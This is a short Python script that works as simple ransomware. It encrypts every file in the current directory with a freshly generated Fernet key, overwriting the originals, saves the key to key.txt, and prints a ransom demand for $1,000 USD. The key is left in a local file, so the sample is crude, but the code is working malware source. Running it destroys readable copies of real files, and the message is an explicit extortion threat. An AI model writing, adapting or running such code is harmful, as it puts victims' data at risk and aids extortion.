import os
import sys
from cryptography.fernet import Fernet

# * Find files in the current directory, add them to a list and encrypt them

files = []

ignoredFiles = [os.path.basename(__file__), 'decrypt.py', '.gitignore']


# * Bucle para descubrir archivos en un directorio
if os.path.exists('key.txt') == True:
    print("The key.txt file already exists cannot encrypt files again")
    sys.exit()
else:
    for file in os.listdir():
        # * Add the files to the array as long as they are not encrypted
        if os.path.isfile(file) and file not in ignoredFiles:
            files.append(file)

# * Library to encrypt files with random key

key = Fernet.generate_key()

# * Creating a file to save the generated password

with open("key.txt", "wb") as allKeys:
    allKeys.write(key)

#! Loop to encrypt file content
for file in files:
    with open(file, "rb") as readFile:
        contents = readFile.read()
        contents_encryted = Fernet(key).encrypt(contents)
    with open(file, "wb") as writeFile:
        writeFile.write(contents_encryted)

#! Listing encrypted files
for file in files:
    print("Encrypted: ", file)
print("Number of encrypted files: ", len(files))
print("-----Your files have been encrypted, send $1,000 USD or they will be permanently deleted----")
